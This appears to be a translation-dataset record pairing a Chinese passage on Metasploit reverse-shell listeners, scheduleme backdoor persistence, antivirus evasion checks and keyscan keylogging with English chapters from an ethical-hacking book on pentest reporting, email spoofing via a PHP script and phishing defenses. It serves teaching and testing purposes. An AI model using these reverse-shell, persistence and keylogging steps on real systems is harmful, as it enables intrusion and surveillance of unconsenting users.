  trans: '


    # Metasploit 使用指南


    1. `Msfconsole`

    2. `Use exploit/multi/handler`

    3. `Set payload windows/meterpreter/reverse_tcp`

    4. `Set lhost {your_ip}`

    5. `Set lport {port}`

    6. `Run`


    当你设置好 Metasploit 监听器并开始接收来自目标系统后门的回调连接时，是因为用户执行了 `unencoded-payload.exe` 文件。


    ## 持久化后门


    你可能记得在大学期间，你会定期回到父母家里取取衣服或寻求一些经济资助。同样，后门也会定期地从伦理黑客那里获取更多指令。


    `meterpreter` 壳（shell）有一个 `scheduleme` 选项，可以实现这一点。你可以使用 `scheduleme` 调度命令在固定的间隔启动。或者，你也可以根据用户操作（如重启系统或登录系统）来调度命令的启动。


    命令如下：`scheduleme -c {“file/command:} -i -l`。


    例如，你可以创建一个计划，当用户重启系统时启动 `unencoded-payload.exe` 文件。该命令仅会在用户重启系统时执行一次。


    ## 可检测性


    如果伦理黑客已经知道目标系统上运行的防病毒系统，他们可以将自己创建的木马或后门上传到以下网站，以查看世界上哪些防病毒软件已经拥有检测这些木马和后门的特征。


    ## 键盘记录器


    键盘记录是在用户或系统管理员在使用系统时记录其击键的过程。目前有多种第三方键盘记录应用程序可用，其中大多数都声称自己具有不被检测的能力。


    虽然事实如此，但在系统上安装键盘记录器需要系统运行某些应用程序以便物理上挂载监听设备。第三方应用程序在做出此类声明时，并没有考虑到目标系统上的病毒扫描器或入侵检测系统。


    Metasploit 内置了一个名为 `keyscan` 的工具。如果伦理黑客已经成功与目标系统建立会，那么使用 `keyscan` 工具的命令非常简单：


    1. `Keyscan_start`

    2. `Keyscan_dump`

    3. `Keyscan_dump`（根据需要重复）

    4. `Keyscan_stop`


    '
- fmt: "\nWe hope this chapter has served as an introduction to the stage of maintaining\
    \ access. This is still a very small portion of a universe full of malware. The\
    \ development of malware can send a researcher to the darkest corners of the Internet,\
    \ but also help an ethical hacker to a secure environment for computer systems\
    \ throughout the world. When you create Trojans and backdoors using the `Metasploit`\
    \ framework, you understand the thought process of malicious attackers because\
    \ the want of the job as an ethical hacker is that you and the malicious attacker\
    \ think alike.\n\n# Chapter Eight: Reporting\n\nTechnical expertise is very important\
    \ for conducting a penetration test as it gets you the desired results to validate\
    \ the security settings of an organization’s digital infrastructure. The senior\
    \ management of the organization is the authority that hires a team of ethical\
    \ hackers to conduct penetration testing and pays them for their assessment. At\
    \ the end of the penetration testing activity, it is expected that this management\
    \ would want to see a report of the entire activity. Similarly, the technical\
    \ heads of various departments in the organization will want to understand the\
    \ vulnerabilities discovered in the systems administered by them or the software\
    \ developed by them so that they can make the necessary corrections if needed.\
    \ This makes `Reporting` a very important stage of the penetration testing lifecycle.\
    \ The test reported is divided into a few sections, and we will discuss them in\
    \ this chapter.\n\nLet us go through the various sections of a penetration test\
    \ report one by one.\n\n## The Penetration Test Report\n\n### Executive Summary\n\
    The highlights of the penetration testing activity are mentioned in the executive\
    \ summary section of the penetration test report. It provides an overview of the\
    \ assessment. This mainly includes details such as:\n- The location of the test\n\
    - If the test was remote or local\n- Details of the members of the ethical hacking\
    \ team\n- Advanced description of the security settings of the information systems\
    \ and the vulnerabilities discovered\n\nThis section also serves as a good place\
    \ to suggest data through visual representation, such as graphs and pie charts\
    \ that show all the exploits that were executed on the target system. You should\
    \ limit this section to three paragraphs. This section goes at the beginning of\
    \ the report but is mostly composed after all the other sections of the penetration\
    \ test report have been completed.\n\n### Engagement Procedure\nThis section will\
    \ contain the engagements of the ethical hacking team along with the limits encountered\
    \ and the various other processes. The section will describe the various types\
    \ of tests that were conducted on the target system. It will have answers to questions\
    \ such as “Was social engineering a part of the test?” “Was there a Denial of\
    \ Service DoS attack conducted?” etc. The section will let everyone know of the\
    \ various attack surfaces and where on those surfaces, vulnerabilities were discovered.\
    \ For example, an ethical hacker conducted a test from a remote location on a\
    \ web application via the Internet, or a wireless attack was conducted by getting\
    \ inside the range of an organization’s wireless network.\n\n### Target Architecture\n\
    This section is optional and includes information about the target’s infrastructure,\
    \ such as their hardware, operating systems used, services offered by the systems,\
    \ open ports, etc. If there were network maps developed by the ethical hacking\
    \ team during the penetration test, this section is a good place to put it.\n\n\
    ### Findings\nAll the vulnerabilities discovered during the penetration test are\
    \ listed down in this section. It is important to categorize these depending on\
    \ the systems where they were identified so that the respective teams have the\
    \ information required to correct the flaws. If it is possible, the security issues\
    \ should be associated with regulatory compliance, as that will help to trace\
    \ the costs to a source of funding. This section will also give the system owners\
    \ an estimate of the costs involved in patching the weaknesses.\n\n### Recommended\
    \ Actions\nThis section defines the corrective actions to be taken for each vulnerability\
    \ that has been discovered. This can be a section of its own with a description\
    \ of every vulnerability, followed by the recommendation on how to fix it. The\
    \ corrective action should not define the exact technical fix but should be a\
    \ generic fix so that the system owners can figure out the exact fix on their\
    \ own. For instance, a finding of a default password should have a recommendation\
    \ that enforces a strong password policy for the employees.\n\n### Conclusion\n\
    This section will summarize the vulnerabilities and the corrective actions proposed\
    \ in a few lines. You can also put down critical findings in this section so that\
    \ system owners can pay extra attention to them.\n\n### Appendices\nThis section\
    \ will cover all the information that supports the report and is information that\
    \ cannot be part of the main body. This will include raw test data, information\
    \ about the ethical hacking team, glossary, definitions, list of acronyms, and\
    \ professional biographies of every individual ethical hacker on the team.\n\n\
    ### Presentation\nMost management would want a briefing of the outcomes of the\
    \ penetration activity to be presented in a formal or semi-formal manner. This\
    \ could also contain a presentation slideshow that will accompany the ethical\
    \ hacker giving the briefing. If an out brief is required, it should be conducted\
    \ professionally. As an ethical hacker who is aware of all the weaknesses in the\
    \ infrastructure, you should avoid attacking the owners of those systems during\
    \ your presentation. You should not target associates from the system administration\
    \ or software engineering team, as they will be the ones taking a call on whom\
    \ to onboard for recurring tests on their infrastructure. It is therefore important\
    \ to maintain a good relationship with all of them. Instead, you can present facts\
    \ and numbers that will replace any emotions and will not accuse anyone. In short,\
    \ just talk about the shortcomings of the system and ways to fix them efficiently.\n\
    \nOther times, the management may not want a presentation and will simply expect\
    \ the report to be delivered to them. In such a case, ensure that the report is\
    \ correct, printed properly, and presentable to the management. Copies of the\
    \ report, both soft and hard, may be requested at times. A count should be maintained\
    \ for all the copies that have been created, and it should be documented as to\
    \ who all have a copy.\n\n### Storage of Report and Evidence\nCertain organizations\
    \ will want the ethical hacking team to maintain a copy of the report. A penetration\
    \ test report has a lot of information that could be catastrophic if it got into\
    \ the wrong hands. Therefore, the accountability of every copy of the report should\
    \ be maintained. Some other organizations may request the deletion of the report.\
    \ The ethical hacking team should do this after consulting legal counsel, as there\
    \ are legal consequences that could be missed. If the penetration testing report\
    \ is acceptable, ensure that the disk had the report is formatted multiple times\
    \ and overwritten with other data. It is also a good practice to have at least\
    \ two people verify the deletion of data. Conducting a penetration test on a system\
    \ can be very beneficial and will help system owners produce.\n\n# Chapter Nine:\
    \ Email Hacking\n\nEmail Hacking is not a big part of the domain, but it is the\
    \ most common time that people fall prey to daily. Email hacking is mostly executed\
    \ by black-hat hackers or white-hat hackers. Knowledge about email hacking will\
    \ help you educate the employees of organization on how to take precautions against\
    \ email. Therefore, our motive with this book is to cover categories of hacking.\n\
    \n### How does Email work?\nEmail servers control the sending and receiving of\
    \ emails. An email service provider will do several configurations on the server\
    \ before they make the server live for people to create accounts, sign in and\
    \ begin receive emails. Once the email service provider is satisfied with the\
    \ settings on their server, they release the server in a live environment for\
    \ people to register on their service. Once a user has created a fully functional\
    \ email account with details, they can connect with other users over the globe.\n\
    \n### How does Email work technically?\nLet us say that we have two email providers,\
    \ `serverone.com` and `serverwo.com`, and there is a user called `userone@serverone.com`\
    \ and `userwo@serverwo.com`. Let us say that `userone@serverone.com` logs into\
    \ their email account and composes a mail to `userwo@serverwo.com` and hits the\
    \ send button, and within a minute, the email is received by `userwo@serverwo.com`\
    \ in their inbox.\n\nBut what has happened technically behind the scenes? Is it\
    \ that simple? When `userone` sends an email to `userwo`, `serverone.com` looks\
    \ up `serverwo.com` on the Internet using the Domain Name System (`DNS`) and establishes\
    \ a connection. It then communicates with `serverwo.com` and tells it about the\
    \ email for `userwo@serverwo.com`. This is when `serverwo.com` looks up for `userwo`\
    \ in its domain, and if `userwo` exists, it further delivers the email in the\
    \ inbox of `userwo@serverwo.com`. After this, when `userwo` sits on their computer\
    \ and logs in to their email account, they find the email from `userone@serverone.com`\
    \ lying in their inbox.\n\nThere are email service providers who set up email\
    \ servers to provide an email service to users. For example, companies like `Google`,\
    \ `Hotmail`, `Yahoo` are the biggest email providers in the world today. They\
    \ have set up huge data centers with their email servers to support the massive\
    \ amount of email traffic that passes through their infrastructure every day.\
    \ However, an email server has custom developed or open-source software that runs\
    \ on it and makes sending and receiving of emails possible. You can convert your\
    \ personal computer into an email server using software like `HMail Server`, `Postfix`,\
    \ `Surge Mail`, etc. `HMail Server` is an email server developed for a system\
    \ running `Microsoft Windows` as its operating system. It allows you to manage\
    \ an email service all by yourself without relying on a third-party email service\
    \ provider. Additionally, `HMail` also has features for spam control so that you\
    \ do not have to worry about receiving spam emails.\n\n### Email Service Protocols\n\
    \n#### SMTP\n`SMTP` (Simple Mail Transfer Protocol) is an email protocol that\
    \ is used when an email is sent out using an email client such as `Microsoft Outlook`\
    \ or `Mozilla Thunderbird`. `SMTP` comes into the picture when a user wants to\
    \ send out an email to another user. `SMTP` works on port number `25` or `587`\
    \ and port number `465` with `SSL`.\n\n#### POP3\n`POP3` (Post Office Protocol)\
    \ allows a user to download emails from an email server onto their local email\
    \ client on their computer. This is a simple protocol that is only used for downloading\
    \ emails. Users usually use the `POP3` protocol when they have limited disk space\
    \ on their email server provided by their email provider and want to keep it free\
    \ for newer emails. Therefore, they use `POP3` to download the emails from their\
    \ email server to their local machines at regular intervals. `POP3` protocol uses\
    \ port number `110` without `SSL` and port number `995` with `SSL`.\n\n#### IMAP\n\
    `IMAP` (Internet Message Access Protocol) is a feature much like `POP3` used to\
    \ retrieve emails from the email server onto a local email client. However, it\
    \ differs from `POP3` in the sense that `IMAP` keeps the emails between the email\
    \ server and email client synchronized. While using the `IMAP` protocol, the emails\
    \ on the email server and email client are mirror copies of each other. `IMAP`\
    \ protocol uses port number `143` without `SSL` and port number `993` with `SSL`.\n\
    \n### Email Security\nEmail is one of the fastest means of communication in the\
    \ world today, but how secure is it? Attackers have a bunch of attacks that can\
    \ be applied via emails. Many people are unsuspecting of attacks and fall prey\
    \ to traps. The security of an organization also depends on its weakest link,\
    \ and sometimes an unaware employee can become the weakest link. The header of\
    \ every email contains complete details of the path it traversed before landing\
    \ in inbox. It is very important to see if an email does not belong to you. The\
    \ headers will help you identify a spoofed email. The header of an email also\
    \ has the following parameters that essentially are the most important parts in\
    \ an email header:\n- mailto\n- from\n- subject\n- message_body\n\nAn attacker\
    \ can simply host this script on a web-hosting server as a `.php` file and replaces\
    \ these parameters with the parameter of their choice to send emails. To give\
    \ you an idea, they can use the `from` parameter of the header as `info@amazon.com`,\
    \ and the recipient will believe that they have received a genuine email from\
    \ `amazon.com`.\n\n### Email Spoofing\nEmail spoofing, as discussed earlier, is\
    \ the manipulation of an email header to make the email look like it came from\
    \ an authentic source. Spammers employ email spoofing to get unsuspecting recipients\
    \ to open their emails and reply to solicitations. The most dangerous part about\
    \ spoofing is that there are legitimate ways available to spoof an email using\
    \ a `FROM` address which you don’t even know.\n\n#### Email Spoofing Methods\n\
    There are many methods to spoof emails, but let us discuss the two most used:\n\
    \n##### Open Relay Server\nAn Open Relay Server is a server with `SMTP` running\
    \ on it and is configured in a way that anyone can send an email from it without\
    \ necessarily being a user that exists on it. This means that unknown users can\
    \ also send mails through it. An attacker can connect to an open relay server\
    \ using `telnet` and type in a set of instructions to send an email through it.\
    \ There is no password authentication required to send an email through open relay\
    \ server.\n\n##### Email Scripts\nThe second most popular way of spoofing emails\
    \ is via email scripts. Email scripts were originally developed to send genuine\
    \ emails, but attackers soon realized that since an email script does not require\
    \ password authentication, it could be used for spoofing as well. An attacker\
    \ just needs to procure a web-hosting service from a provider and set up an email\
    \ script to modify the email headers as per their requirement. Many hosting providers\
    \ have realized that this may result in an unclean reputation for their server\
    \ and have started putting restrictions on their servers that the `FROM` address\
    \ in the mail script needs to match the domain name of the hosting package and\
    \ cannot be any other domain name. Let us look at an example of a PHP mail sending\
    \ script:\n\n```php\n<?\n$mailto=\"some-name@yourdomain.com\";\n$pcount=0;\n$gcount=0;\n\
    $subject = \"Mail from Enquiry Form\";\n$from=\"some-name@abc.com\";\nwhile (list\
    \ ($key,$val)=each($_POST)){\n    $pstr = $pstr.\"$key : $val \\n \";\n    $pcount++;\n\
    }\nwhile (list ($key,$val)=each($_GET)){\n    $gstr = $gstr.\"$key : $val \\n\
    \ \";\n    $gcount++;\n}\nif ($pcount > $gcount){\n    $message_body=$pstr;\n\
    \    mail ($mailto,$subject,$message_body,\"From:\".$from);\n    echo \"Mail has\
    \ been sent\";\n}else{\n    $message_body=$gstr;\n    mail ($mailto,$subject,$message_body,\"\
    From:\".$from);\n    echo \"Mail has been sent\";\n}\n?>\n```\n\nIf you look at\
    \ this PHP mail script, you will see that it has the following parameters that\
    \ essentially are the most important parts in an email header:\n- `mailto`\n-\
    \ `from`\n- `subject`\n- `message_body`\n\n#### Consequences of Receiving a Spoofed\
    \ Email\nSpoofed emails, if taken seriously by the recipients, can have dangerous\
    \ consequences:\n- An email about a bomb spoofed from your email ID and sent to\
    \ a security agency can result in you spending the rest of your life in prison.\n\
    - Spoofed emails between partners or spouses containing hurtful information can\
    \ result in a breakup or a divorce.\n- A spoofed email from your email ID containing\
    \ a resignation letter sent to your boss can have bad consequences.\n- Spoofed\
    \ emails can be used for fraudulent activities leading to monetary losses.\n\n\
    #### Identifying a Spoofed Email\nThe header of every email contains complete\
    \ details of the path it traversed before landing in inbox. It is very important\
    \ to see if an email does not belong to you. The headers will help you identify\
    \ a spoofed email. The subject of the email matches something like:\n- `Your account\
    \ has been hacked!`\n- `Your bank account has been hacked.`\n- `Your email requests\
    \ to deposit`\n- `Your email requests information along the lines of:`\n- `Your\
    \ password immediately`\n\nIn addition to this, there are certain technical parameters\
    \ in the header that will help you understand if the email is spoofed too. Let\
    \ us have a look at the following part of email received by `gmail.com`:\n\n`Received-SPF:\
    \ pass (google.com: best record for domain of postmaster@mail-sor-f6.google.com)\
    \ client-ip=209.85.220.69`\n`Authentication-Results: mx.google.com;dkim=pass header.i=@googlemail.com.s=201605;spf=pass\
    \ (google.com: best record for domain of postmaster@mail-sor-f.google.com) designates\
    \ 209.85.220.69 as permitted sender) smtp.helo=mail-sor6.com;dmarc=pass (p=QUARANTINE\
    \ sp=QUARANTINE dis=NONE) from=googlemail.com`\n`DKIM-Signature: v=1; a=rsa-sha256;\
    \ c=relaxed/relaxed;d=googlemail.com; s=201605;h:to:auto-submitted:message-id:date:from:subject:references:in-reply-to;bh=cfcLUX2oA1dgPHL34Z1qoUnCvAkr1/oTXh1PoFQIY=;`\
    \ This header contains two parameters that are used by email servers to identify\
    \ the authenticity of an incoming email.\n\nReceived-SPF\nAn `SPF` record is a\
    \ `TXT` based DNS record that is provided by an email provider to be added in\
    \ the DNS zone of a domain name. The `SPF` record syntax has IP addresses that\
    \ are allowed to send emails on behalf of the domain name. In the above example,\
    \ when `gmail.com` is analyzing the incoming email, it is checking the `SPF` record\
    \ of the sender’s domain name and can see that the IP `209.85.220.69` is allowed\
    \ to send the email on the domain’s behalf. If the source IP of the incoming email\
    \ were to be something else, `gmail.com` would have classified the email as spam.\n\
    \nDKIM-Signature\nThe `DKIM` signature is another parameter that holds a publicly\
    \ available key with which the sender’s domain has been signed. When `gmail.com`\
    \ receives the incoming email, it sends a request to the sender’s server to match\
    \ this key with the sender domain’s respective key on the originating server.\
    \ If the key matches, the email is believed to be genuine again.\n\nEmail Phishing\n\
    Email Phishing is the process of sending an email to a person claiming to be someone\
    \ and tricking them into disclosing sensitive information such as their personal\
    \ details or bank account details. Essentially, email phishing is a product of\
    \ email spoofing. The attacker will send you an email; they may do this by manipulating\
    \ the headers of the email to look like a legitimate source. Alternatively, if\
    \ they aren’t good at hacking, they will try to send an email from an email address\
    \ that is similar to legitimate addresses. For example, they will create an email\
    \ address like `info@cibank.com`. At first glance this looks like a genuine email\
    \ address for `Citibank`, but if you look closely, there are two `i`s in it. If\
    \ you are not very careful, you may end up clicking on a malicious link in the\
    \ body of the email to redirect you to a website where you will be asked for your\
    \ details.\n\nPhishing Scams\nWhat do some of the most common phishing emails\
    \ look like? Phishing emails mostly have content that promises you have won something.\
    \ Attackers rely on how gullible a target is to be successful in scams. In early\
    \ 2000, attackers sent out lot emails claiming they were someone with a lot of\
    \ wealth and wanted to give it away to common people. However, as the process\
    \ progresses, attackers would request the users to transfer a minimal amount of\
    \ money to their account.\n\nPrevention against Phishing\nYou can follow some\
    \ basic precautions to protect yourself against scams:\n- Make sure that you read\
    \ an email carefully and double-check the sender of the email. If the sender is\
    \ a known friend, but the email looks bit odd, call them up and check with them\
    \ if they sent you any.\n- If the email contains links, carefully examine the\
    \ link before clicking on it.\n- If you have somehow clicked on a link and landed\
    \ on a website requesting you to enter your details, examine the URL in the browser\
    \ to check if it is indeed a URL you are familiar with.\n- Login into websites\
    \ that have a digital certificate installed on them and work on `HTTPS`.\n\nSecuring\
    \ your Email Account\nSimple measures can go a long way in protecting yourself\
    \ from email hacking. Some simple steps:\n- When you set up a new email account,\
    \ always configure a secondary email account or an alternate email account to\
    \ help you with recovery in case the primary account is hacked.\n- Do not take\
    \ the security questions section of setting up a email account lightly. Set up\
    \ real questions with real answers as the security questions will help you recover\
    \ an account if it is hacked or if you have forgotten your password.\n- As a thumb\
    \ rule, avoid opening emails from strangers.\n- Always use your personal computer\
    \ to check emails and do not use anyone else’s computer as you may end up leaving\
    \ your email account logged in on their.\n- No matter how much you trust a person,\
    \ never reveal your passwords to them.\n\nConclusion\nI sincerely hope you enjoyed\
    \ this book and that it helped you to get-started into the world of ethical hacking.\
    \ The tools mentioned in every chapter of the penetration testing lifecycle are\
    \ the most popular and commonly used tools by ethical hackers. You can use them\
    \ as a foundation to explore other tools available in `Kali Linux` that will help\
    \ you in every stage of the penetration testing lifecycle. I would like to conclude\
    \ by saying that ethical hacking is a noble profession and not a criminal activity\
    \ as misinterpreted by the masses. While it is a fact that malicious hacking is\
    \ a crime and should be considered as a criminal activity, ethical hacking never\
    \ was, and never will be categorized as a crime. The main aim of ethical hacking\
    \ is to help companies with IT policies and industry regulations. Ethical hacking\
    \ was designed to prevent malicious hacking. Malicious hacking should be prevented,\
    \ but at the same time, ethical hacking, which encourages innovation, research,\
    \ and technological breakthroughs, needs to be promoted so that the masses can\
    \ be aware of this noble profession. Now that you know how to get started with\
    \ hacking, it is my responsibility to tell you to use the skills for a good reason.\
    \ There are many job opportunities out there, and there is a lot of respect for\
    \ ethical hackers, so make use of your talent and hone your skills. I wish you\
    \ good luck with your hacking endeavors.\n\nReferences\n- `https://www.kali.org/`\n\
    - `https://www.getastra.com/blog/knowledge-base/hacking-terminologies/`\n- `https://www.simplilearn.com/tutorials/cyber-security-tutorial/what-is-ethical-hacking`\n\
    - `https://www.getastra.com/blog/knowledge-base/hacking-terminologies/`\n"
